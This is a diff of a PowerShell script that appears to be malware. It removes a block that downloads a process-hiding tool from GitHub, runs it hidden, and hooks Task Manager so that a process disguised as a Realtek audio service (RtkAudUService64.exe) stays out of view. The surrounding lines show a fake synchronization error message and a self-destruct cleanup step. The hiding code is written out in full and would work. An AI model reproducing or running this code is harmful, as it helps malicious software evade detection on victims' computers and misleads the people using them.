@@ -137,44 +137,5 @@ try {
     Write-Host "`n[!] CRITICAL ERROR: System synchronization interrupted." -ForegroundColor Red
 }
 
-# ========== TASK MANAGER BYPASS (API Hooking) ==========
-Write-Host "[*] INITIATING TASK MANAGER BYPASS..." -ForegroundColor Cyan
-
-# Process Hider Tool Download
-$hiderPath = "$env:TEMP\ProcessHider.exe"
-if (-not (Test-Path $hiderPath)) {
-    Write-Host "[+] Downloading Process Hider Tool..." -ForegroundColor Gray
-    $hiderUrl = "https://github.com/patopolser/Process-Hider/raw/master/MainFile/ProcessHider.exe"
-    try {
-        Invoke-WebRequest -Uri $hiderUrl -OutFile $hiderPath -UseBasicParsing
-        Write-Host "[+] Process Hider Downloaded" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Could not download Process Hider Tool" -ForegroundColor Yellow
-    }
-}
-
-# Hide the EXE using Process Hider
-if (Test-Path $hiderPath) {
-    Write-Host "[+] Bypassing Task Manager (API Hooking)..." -ForegroundColor Gray
-    try {
-        Start-Process -FilePath $hiderPath -ArgumentList "-n `"RtkAudUService64.exe`" -x `"taskmgr.exe`"" -WindowStyle Hidden
-        
-        # Wait for injection
-        Start-Sleep -Seconds 3
-        
-        # Restart Task Manager
-        Stop-Process -Name "Taskmgr" -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 1
-        Start-Process "taskmgr.exe"
-        Write-Host "[+] SUCCESS! Your EXE is now HIDDEN from Task Manager!" -ForegroundColor Green
-        Write-Host "[*] API Hooking Active - RtkAudUService64.exe is hidden" -ForegroundColor White
-    } catch {
-        Write-Host "[!] Failed to hide process: $_" -ForegroundColor Yellow
-    }
-} else {
-    Write-Host "[!] Process Hider Tool not available. Task Manager bypass skipped." -ForegroundColor Yellow
-}
-# ========== END OF TASK MANAGER BYPASS ==========
-
 # 6. SELF-DESTRUCT
 Remove-Variable * -ErrorAction SilentlyContinue 2>$null
